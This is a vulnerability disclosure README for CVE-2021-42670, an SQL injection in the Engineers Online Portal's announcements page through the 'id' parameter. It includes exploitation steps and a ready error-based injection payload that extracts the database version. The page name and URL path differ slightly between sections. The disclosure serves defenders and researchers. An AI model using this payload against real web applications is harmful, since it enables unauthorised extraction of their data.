# CVE-2021-42670
CVE-2021-42670 - SQL Injection vulnerability in the Engineers online portal system. 

# Technical description:
An SQL Injection vulnerability exists in the Engineers Online Portal. An attacker can leverage the vulnerable "id" parameter in the "announcements_student.php" web page in order to manipulate the sql query performed.
As a result the attacker can extract sensitive data from the web server.

Affected components - 

Vulnerable page - announcements_student.php

Vulnerable parameter - "id"

# Steps to exploit:
1) Navigate to http://localhost/nia_munoz_monitoring_system/announcements_students.php
2) Insert your payload in the id parameter

# Proof of concept (Poc) -
The following payload will allow you to extract the MySql server version running on the web server -
```
1' AND (SELECT 4356 FROM(SELECT COUNT(*),CONCAT(0x7178787071,(MID((IFNULL(CAST(VERSION() AS NCHAR),0x20)),1,51)),0x7178786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'pMLo'='pMLo
```

![CVE-2021-42670](https://user-images.githubusercontent.com/93016131/140195568-31693a7a-12ac-4a37-9f41-329c6524e1a8.gif)

# References - 
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42670

https://nvd.nist.gov/vuln/detail/CVE-2021-42670

# Discovered by - 
Alon Leviev(0xDeku), 22 October, 2021. 
